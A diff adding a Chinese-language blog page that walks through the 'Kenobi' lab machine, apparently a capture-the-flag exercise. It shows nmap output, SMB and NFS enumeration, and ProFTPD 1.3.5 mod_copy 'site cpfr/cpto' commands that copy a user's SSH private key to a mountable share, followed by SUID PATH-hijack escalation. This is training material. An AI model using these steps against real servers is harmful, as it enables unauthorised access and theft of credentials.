@@ -1,0 +1,836 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Kenobbi | X1NRI</title>
+  <meta name="author" content="X1NRI">
+  
+  <meta name="description" content="有关利用 Linux 机器的演练。枚举 Samba 共享、操纵 proftpd 的易受攻击版本并通过路径变量操纵来升级您的权限。
+
+泄露nmap先扫一遍，linux机器，开了21、22，80，以及135、445端口的SMB
+Nmap scan report for 10.10.26.229
+Host is up (0.23s latency).
+Not shown: 993 closed tcp ports (reset)
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         ProFTPD 1.3.5
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
+|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
+|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
+80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: POST OPTIONS GET HEAD
+|_http-title: Site doesn&#39;t have a title (text/html).
+| http-robots.txt: 1 disallowed entry 
+|_/admin.html
+111/tcp  open  rpcbind     2-4 (RPC #100000)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+2049/tcp open  nfs         2-4 (RPC #100003)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.94SVN%E=4%D=5/31%OT=21%CT=1%CU=44711%PV=Y%DS=2%DC=T%G=Y%TM=6659
+OS:D436%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=8)
+OS:SEQ(SP=104%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=8)SEQ(SP=104%GCD=1%ISR=10A%TI
+OS:=Z%CI=I%II=I%TS=8)OPS(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M
+OS:508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68D
+OS:F%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%D
+OS:F=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=
+OS:Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF
+OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
+OS:%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G
+OS:)IE(R=Y%DFI=N%T=40%CD=S)
+
+Uptime guess: 0.076 days (since Fri May 31 19:54:28 2024)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=259 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb2-time: 
+|   date: 2024-05-31T13:44:12
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: kenobi
+|   NetBIOS computer name: KENOBI\x00
+|   Domain name: \x00
+|   FQDN: kenobi
+|_  System time: 2024-05-31T08:44:12-05:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_clock-skew: mean: 1h39m59s, deviation: 2h53m13s, median: -1s
+| nbstat: NetBIOS name: KENOBI, NetBIOS user: &amp;lt;unknown&gt;, NetBIOS MAC: &amp;lt;unknown&gt; (unknown)
+| Names:
+|   KENOBI&amp;lt;00&gt;           Flags: &amp;lt;unique&gt;&amp;lt;active&gt;
+|   KENOBI&amp;lt;03&gt;           Flags: &amp;lt;unique&gt;&amp;lt;active&gt;
+|   KENOBI&amp;lt;20&gt;           Flags: &amp;lt;unique&gt;&amp;lt;active&gt;
+|   \x01\x02__MSBROWSE__\x02&amp;lt;01&gt;  Flags: &amp;lt;group&gt;&amp;lt;active&gt;
+|   WORKGROUP&amp;lt;00&gt;        Flags: &amp;lt;group&gt;&amp;lt;active&gt;
+|   WORKGROUP&amp;lt;1d&gt;        Flags: &amp;lt;unique&gt;&amp;lt;active&gt;
+|_  WORKGROUP&amp;lt;1e&gt;        Flags: &amp;lt;group&gt;&amp;lt;active&gt;
+
+TRACEROUTE (using port 1025/tcp)
+HOP RTT       ADDRESS
+1   250.87 ms 10.11.0.1
+2   250.88 ms 10.10.26.229
+扫目录也并没有发现什么可用的
+该主机名为KENOBI，工作组为WORKGROUP，其SMB共享着一个名为 anonymous 的目录，尝试能否匿名登录：
+下载下来一个名为log.txt的文件
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/kenobi/.ssh/id_rsa): 
+Created directory &#39;/home/kenobi/.ssh&#39;.
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /home/kenobi/.ssh/id_rsa.
+Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
+The key fingerprint is:
+SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi
+The key&#39;s randomart image is:
++---[RSA 2048]----+
+|                 |
+|           ..    |
+|        . o. .   |
+|       ..=o +.   |
+|      . So.o++o. |
+|  o ...+oo.Bo*o  |
+| o o ..o.o+.@oo  |
+|  . . . E .O+= . |
+|     . .   oBo.  |
++----[SHA256]-----+
+
+# This is a basic ProFTPD configuration file (rename it to 
+# &#39;proftpd.conf&#39; for actual use.  It establishes a single server
+# and a single anonymous login.  It assumes that you have a user/group
+# &#34;nobody&#34; and &#34;ftp&#34; for normal operation and anon.
+
+ServerName			&#34;ProFTPD Default Installation&#34;
+ServerType			standalone
+DefaultServer			on
+
+# Port 21 is the standard FTP port.
+Port				21
+
+# Don&#39;t use IPv6 support by default.
+UseIPv6				off
+
+# Umask 022 is a good standard umask to prevent new dirs and files
+# from being group and world writable.
+Umask				022
+
+# To prevent DoS attacks, set the maximum number of child processes
+# to 30.  If you need to allow more than 30 concurrent connections
+# at once, simply increase this value.  Note that this ONLY works
+# in standalone mode, in inetd mode you should use an inetd server
+# that allows you to limit maximum number of processes per service
+# (such as xinetd).
+MaxInstances			30
+
+# Set the user and group under which the server will run.
+User				kenobi
+Group				kenobi
+
+# To cause every FTP user to be &#34;jailed&#34; (chrooted) into their home
+# directory, uncomment this line.
+#DefaultRoot ~
+
+# Normally, we want files to be overwriteable.
+AllowOverwrite		on
+
+# Bar use of SITE CHMOD by default
+&amp;lt;Limit SITE_CHMOD&gt;
+  DenyAll
+&amp;lt;/Limit&gt;
+
+# A basic anonymous configuration, no upload directories.  If you do not
+# want anonymous users, simply delete this entire &amp;lt;Anonymous&gt; section.
+&amp;lt;Anonymous ~ftp&gt;
+  User				ftp
+  Group				ftp
+
+  # We want clients to be able to login with &#34;anonymous&#34; as well as &#34;ftp&#34;
+  UserAlias			anonymous ftp
+
+  # Limit the maximum number of anonymous logins
+  MaxClients			10
+
+  # We want &#39;welcome.msg&#39; displayed at login, and &#39;.message&#39; displayed
+  # in each newly chdired directory.
+  DisplayLogin			welcome.msg
+  DisplayChdir			.message
+
+  # Limit WRITE everywhere in the anonymous chroot
+  &amp;lt;Limit WRITE&gt;
+    DenyAll
+  &amp;lt;/Limit&gt;
+&amp;lt;/Anonymous&gt;
+#
+# Sample configuration file for the Samba suite for Debian GNU/Linux.
+#
+#
+# This is the main Samba configuration file. You should read the
+# smb.conf(5) manual page in order to understand the options listed
+# here. Samba has a huge number of configurable options most of which 
+# are not shown in this example
+#
+# Some options that are often worth tuning have been included as
+# commented-out examples in this file.
+#  - When such options are commented with &#34;;&#34;, the proposed setting
+#    differs from the default Samba behaviour
+#  - When commented with &#34;#&#34;, the proposed setting is the default
+#    behaviour of Samba but the option is considered important
+#    enough to be mentioned here
+#
+# NOTE: Whenever you modify this file you should run the command
+# &#34;testparm&#34; to check that you have not made any basic syntactic 
+# errors. 
+
+#======================= Global Settings =======================
+......
+
+是关于 ProFTPD 服务的配置文件，可命名为 proftpd.conf 以实际使用
+nfs挂载的目录名为 &amp;#x2F;var，尝试挂载"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Kenobbi"/>
+  <meta property="og:site_name" content="X1NRI"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="X1NRI" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">X1NRI</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/links" title="Subscribe me.">
+			  <i class="fa fa-chain"></i>Links
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Kenobbi</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <blockquote>
+<p>有关利用 Linux 机器的演练。枚举 Samba 共享、操纵 proftpd 的易受攻击版本并通过路径变量操纵来升级您的权限。</p>
+</blockquote>
+<h1 id="泄露"><a href="#泄露" class="headerlink" title="泄露"></a>泄露</h1><p>nmap先扫一遍，linux机器，开了21、22，80，以及135、445端口的SMB</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">Nmap scan report for 10.10.26.229
+Host is up (0.23s latency).
+Not shown: 993 closed tcp ports (reset)
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         ProFTPD 1.3.5
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
+|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
+|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
+80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: POST OPTIONS GET HEAD
+|_http-title: Site doesn't have a title (text/html).
+| http-robots.txt: 1 disallowed entry 
+|_/admin.html
+111/tcp  open  rpcbind     2-4 (RPC #100000)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+2049/tcp open  nfs         2-4 (RPC #100003)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.94SVN%E=4%D=5/31%OT=21%CT=1%CU=44711%PV=Y%DS=2%DC=T%G=Y%TM=6659
+OS:D436%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=8)
+OS:SEQ(SP=104%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=8)SEQ(SP=104%GCD=1%ISR=10A%TI
+OS:=Z%CI=I%II=I%TS=8)OPS(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M
+OS:508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68D
+OS:F%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%D
+OS:F=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=
+OS:Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF
+OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
+OS:%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G
+OS:)IE(R=Y%DFI=N%T=40%CD=S)
+
+Uptime guess: 0.076 days (since Fri May 31 19:54:28 2024)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=259 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb2-time: 
+|   date: 2024-05-31T13:44:12
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: kenobi
+|   NetBIOS computer name: KENOBI\x00
+|   Domain name: \x00
+|   FQDN: kenobi
+|_  System time: 2024-05-31T08:44:12-05:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_clock-skew: mean: 1h39m59s, deviation: 2h53m13s, median: -1s
+| nbstat: NetBIOS name: KENOBI, NetBIOS user: &lt;unknown>, NetBIOS MAC: &lt;unknown> (unknown)
+| Names:
+|   KENOBI&lt;00>           Flags: &lt;unique>&lt;active>
+|   KENOBI&lt;03>           Flags: &lt;unique>&lt;active>
+|   KENOBI&lt;20>           Flags: &lt;unique>&lt;active>
+|   \x01\x02__MSBROWSE__\x02&lt;01>  Flags: &lt;group>&lt;active>
+|   WORKGROUP&lt;00>        Flags: &lt;group>&lt;active>
+|   WORKGROUP&lt;1d>        Flags: &lt;unique>&lt;active>
+|_  WORKGROUP&lt;1e>        Flags: &lt;group>&lt;active>
+
+TRACEROUTE (using port 1025/tcp)
+HOP RTT       ADDRESS
+1   250.87 ms 10.11.0.1
+2   250.88 ms 10.10.26.229<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>扫目录也并没有发现什么可用的</p>
+<p>该主机名为KENOBI，工作组为WORKGROUP，其SMB共享着一个名为 anonymous 的目录，尝试能否匿名登录：<br><img src="/Red_FILE/c94765f113921783c9fdc765038e6ac5_MD5.jpeg"></p>
+<p>下载下来一个名为log.txt的文件</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">Generating public/private rsa key pair.
+Enter file in which to save the key (/home/kenobi/.ssh/id_rsa): 
+Created directory '/home/kenobi/.ssh'.
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /home/kenobi/.ssh/id_rsa.
+Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
+The key fingerprint is:
+SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi
+The key's randomart image is:
++---[RSA 2048]----+
+|                 |
+|           ..    |
+|        . o. .   |
+|       ..=o +.   |
+|      . So.o++o. |
+|  o ...+oo.Bo*o  |
+| o o ..o.o+.@oo  |
+|  . . . E .O+= . |
+|     . .   oBo.  |
++----[SHA256]-----+
+
+# This is a basic ProFTPD configuration file (rename it to 
+# 'proftpd.conf' for actual use.  It establishes a single server
+# and a single anonymous login.  It assumes that you have a user/group
+# "nobody" and "ftp" for normal operation and anon.
+
+ServerName			"ProFTPD Default Installation"
+ServerType			standalone
+DefaultServer			on
+
+# Port 21 is the standard FTP port.
+Port				21
+
+# Don't use IPv6 support by default.
+UseIPv6				off
+
+# Umask 022 is a good standard umask to prevent new dirs and files
+# from being group and world writable.
+Umask				022
+
+# To prevent DoS attacks, set the maximum number of child processes
+# to 30.  If you need to allow more than 30 concurrent connections
+# at once, simply increase this value.  Note that this ONLY works
+# in standalone mode, in inetd mode you should use an inetd server
+# that allows you to limit maximum number of processes per service
+# (such as xinetd).
+MaxInstances			30
+
+# Set the user and group under which the server will run.
+User				kenobi
+Group				kenobi
+
+# To cause every FTP user to be "jailed" (chrooted) into their home
+# directory, uncomment this line.
+#DefaultRoot ~
+
+# Normally, we want files to be overwriteable.
+AllowOverwrite		on
+
+# Bar use of SITE CHMOD by default
+&lt;Limit SITE_CHMOD>
+  DenyAll
+&lt;/Limit>
+
+# A basic anonymous configuration, no upload directories.  If you do not
+# want anonymous users, simply delete this entire &lt;Anonymous> section.
+&lt;Anonymous ~ftp>
+  User				ftp
+  Group				ftp
+
+  # We want clients to be able to login with "anonymous" as well as "ftp"
+  UserAlias			anonymous ftp
+
+  # Limit the maximum number of anonymous logins
+  MaxClients			10
+
+  # We want 'welcome.msg' displayed at login, and '.message' displayed
+  # in each newly chdired directory.
+  DisplayLogin			welcome.msg
+  DisplayChdir			.message
+
+  # Limit WRITE everywhere in the anonymous chroot
+  &lt;Limit WRITE>
+    DenyAll
+  &lt;/Limit>
+&lt;/Anonymous>
+#
+# Sample configuration file for the Samba suite for Debian GNU/Linux.
+#
+#
+# This is the main Samba configuration file. You should read the
+# smb.conf(5) manual page in order to understand the options listed
+# here. Samba has a huge number of configurable options most of which 
+# are not shown in this example
+#
+# Some options that are often worth tuning have been included as
+# commented-out examples in this file.
+#  - When such options are commented with ";", the proposed setting
+#    differs from the default Samba behaviour
+#  - When commented with "#", the proposed setting is the default
+#    behaviour of Samba but the option is considered important
+#    enough to be mentioned here
+#
+# NOTE: Whenever you modify this file you should run the command
+# "testparm" to check that you have not made any basic syntactic 
+# errors. 
+
+#======================= Global Settings =======================
+......
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>是关于 ProFTPD 服务的配置文件，可命名为 proftpd.conf 以实际使用<br><img src="/Red_FILE/337ceb5493e57ac85565b2e12e502bb4_MD5.jpeg"></p>
+<p>nfs挂载的目录名为 &#x2F;var，尝试挂载<br><img src="/Red_FILE/644c5c6674519ca8757467af8ae4373b_MD5.jpeg"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">mount</span> <span class="token parameter variable">-t</span> nfs IP:var /tmp/mount/ <span class="token parameter variable">-nolock</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">┌──(x1nri㉿X1NRI)-[/tmp/mount]                                                                                                                                                      
+└─$ tree -L 2                                                                                                                                                                       
+.                                                                                                                                                                                   
+├── backups                                                                                                                                                                         
+│   └── apt.extended_states.0                                                                                                                                                       
+├── cache                                                                                                                                                                           
+│   ├── apache2                                                                                                                                                                     
+│   ├── apparmor                             
+│   ├── apt                                  
+│   ├── debconf                              
+│   ├── ldconfig                             
+│   ├── samba                                
+│   └── snapd                                
+├── crash                                    
+├── lib                                      
+│   ├── apache2                              
+│   ├── apparmor                             
+│   ├── apt                                  
+│   ├── dbus                                 
+│   ├── dhcp                                 
+│   ├── dpkg                                 
+│   ├── git                                  
+│   ├── initramfs-tools
+│   ├── initscripts                          
+│   ├── insserv                              
+│   ├── locales                              
+│   ├── logrotate                            
+│   ├── lxcfs                                
+│   ├── lxd                                  
+│   ├── mdadm                                
+│   ├── misc  
+│   ├── nfs                                  
+│   ├── os-prober                            
+│   ├── pam                                  
+│   ├── plymouth                             
+│   ├── polkit-1                             
+│   ├── python                               
+│   ├── resolvconf                           
+│   ├── samba                                
+│   ├── sgml-base                            
+│   ├── snapd                                
+│   ├── sudo                                 
+│   ├── systemd                              
+│   ├── ubuntu-release-upgrader
+│   ├── ucf                                  
+│   ├── update-manager                       
+│   ├── update-notifier
+│   ├── update-rc.d                          
+│   ├── urandom                              
+│   ├── ureadahead                           
+│   ├── usbutils                             
+│   ├── vim                                  
+│   └── xml-core                             
+├── local                                    
+├── lock -> /run/lock                        
+├── log                                                                                                                                                                             
+│   ├── alternatives.log                                                                                                                                                            
+│   ├── apache2                                                                                                                                                                     
+│   ├── apt                                                                                                                                                                         
+│   ├── auth.log                                                                                                                                                                    
+│   ├── bootstrap.log                                                                                                                                                               
+│   ├── btmp                                                                                                                                                                        
+│   ├── dist-upgrade                         
+│   ├── dmesg                                
+│   ├── dpkg.log                             
+│   ├── faillog                              
+│   ├── fsck                                 
+│   ├── installer                            
+│   ├── kern.log                             
+│   ├── lastlog                              
+│   ├── lxd                                  
+│   ├── samba                                
+│   ├── syslog                               
+│   ├── unattended-upgrades
+│   └── wtmp                                 
+├── mail                                     
+├── opt                                      
+├── run -> /run                              
+├── snap                                     
+├── spool                                    
+│   ├── cron                                 
+│   ├── mail -> ../mail
+│   ├── rsyslog                              
+│   └── samba                                
+├── tmp      
+│   ├── systemd-private-2408059707bc41329243d2fc9e613f1e-systemd-timesyncd.service-a5PktM
+│   ├── systemd-private-5500f667562f4ca398e68a1a400ee47c-systemd-timesyncd.service-t53kKa
+│   ├── systemd-private-6f4acd341c0b40569c92cee906c3edc9-systemd-timesyncd.service-z5o4Aw
+│   └── systemd-private-e69bbb0653ce4ee3bd9ae0d93d2a5806-systemd-timesyncd.service-zObUdn
+└── www
+    └── html
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>拿到了网站的源码，纯静态页面😓</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">┌──(x1nri㉿X1NRI)-[/tmp/mount]
+└─$ ls ./www/html    
+admin.html  image.gif  image.jpg  index.html  robots.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+
+<p>捕获到 ftp 的用户名是 <code>kenobi</code> ，运行在21端口，尝试匿名登录，结果要向我要邮箱<br><img src="/Red_FILE/e12818a25e85662d460f174860b3fb8b_MD5.jpeg"><br>我回去重新看了看挂载点下mail文件夹有没有什么邮件信息，可惜是空的</p>
+<p>尝试 hydra 爆一下弱口令，但未果</p>
+<h1 id="入侵"><a href="#入侵" class="headerlink" title="入侵"></a>入侵</h1><p>好像陷入了绝境</p>
+<p>重新审视开放的端口，在111运行着 rpcbind</p>
+<blockquote>
+<p>rpcbind是NFS中用来进行消息通知的服务，且需要NFS配置开启 rpcbind_enable&#x3D;“YES”。<br>NFS基于RPC（远程过程调用），NFS本身没有提供传输机制，传输机制通过RPC实现，RPC服务在rhel6中是rpcbind，在rhel5中是portmap，rpc端口号111，nfs端口号2049</p>
+</blockquote>
+<p>会不会有CVE？ProFTPD的版本是 1.3.5 ，一搜还真有：<a target="_blank" rel="noopener" href="https://github.com/t0kx/exploit-CVE-2015-3306">t0kx&#x2F;exploit-CVE-2015-3306: ProFTPd 1.3.5 - (mod_copy) Remote Command Execution exploit and vulnerable container (github.com)</a></p>
+<blockquote>
+<p>ProFTPD 1.3.5中的 mod_copy 模块允许远程攻击者通过站点 <code>site cpfr</code> 和 <code>site cpto</code> 命令，可用于将文件&#x2F;目录从服务器上的一个位置复制到服务器的另一个位置，且调用该命令无需登录</p>
+</blockquote>
+<p>如果利用该漏洞拷贝一些敏感信息到&#x2F;var下（比如ssh的私钥），我们再挂载&#x2F;var文件夹，就能拿到 id_rsa</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">ftp> site cpfr /home/kenobi/.ssh/id_rsa
+350 File or directory exists, ready for destination name
+ftp> site cpto /var/tmp/id_rsa
+250 Copy successful<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>已知ftp的用户名是kenobi，猜想ssh用户名可能也一样</p>
+<p>赋予600，登录拿下主机权限<br><img src="/Red_FILE/cfa936b28bcde06c40d6b49e89d92756_MD5.jpeg"></p>
+<p>该主机只有root和kenobi两个账户</p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>启动 python-server，上脚本收集信息</p>
+<p>Ubuntu 16.04.6 LTS，4.8.0-58-generic 的内核</p>
+<p>发现一个二进制文件menu具有SUID<br><img src="/Red_FILE/1493e02a75a38eb7f27248259ffadbe0_MD5.jpeg"></p>
+<p><img src="/Red_FILE/32ad9df8d2987ba05041b3b0aca6294b_MD5.jpeg"></p>
+<p>menu1 实现了 curl，menu2 实现了 uname -r，menu3 实现了 ifconfig</p>
+<p>我选择拿menu2开刀，利用PATH实现提权<br><img src="/Red_FILE/9b3bdf36e6bd4493cf8e55a6987b81f2_MD5.jpeg"></p>
+
+	  <div class="article-footer-copyright">
+
